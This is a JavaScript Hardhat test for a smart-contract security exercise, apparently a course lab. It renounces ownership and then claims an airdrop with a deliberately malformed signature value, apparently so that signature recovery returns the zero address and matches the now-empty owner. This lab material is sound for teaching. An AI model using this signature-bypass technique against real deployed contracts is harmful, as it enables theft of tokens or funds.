const {ethers} = require('hardhat');
const {expect} = require('chai');
const {loadFixture} = require("ethereum-waffle");
describe("Week22Exercise3", function () {
    /// If the ownership is renounced to another user, that user can act freely to claim the air drop
    // should this be considered as a vulnerability?
    const deploy = async () => {
        const [deployer, user1] = await ethers.getSigners();
        const contractFactory = await ethers.getContractFactory("Week22Exercise3", deployer);
        const contract = await contractFactory.deploy();
        return {deployer, user1, contract}
    }

    it("", async () => {
        const {deployer, user1, contract} = await loadFixture(deploy)
        const params = ethers.utils.solidityPack(
            ["uint256", "uint256", "address"],
            [0, 100, user1.address]
        );
        // console.log(params)

        const hash = ethers.utils.keccak256(params)
        // const signedMessage = await user1.signMessage(hash);
        const signedMessage = await deployer.signMessage(hash);
        const {r, s, v} = ethers.utils.splitSignature(signedMessage)
        // const a = ethers.utils.verifyMessage(hash, signedMessage);
        // console.log(hash)


        const tnx1 = await contract.connect(deployer).renounceOwnership();
        await tnx1.wait()
        const tnx2 = await contract.connect(user1).claimAirdrop(100, user1.address, v-20, r, s);
        await tnx2.wait()

    })
});

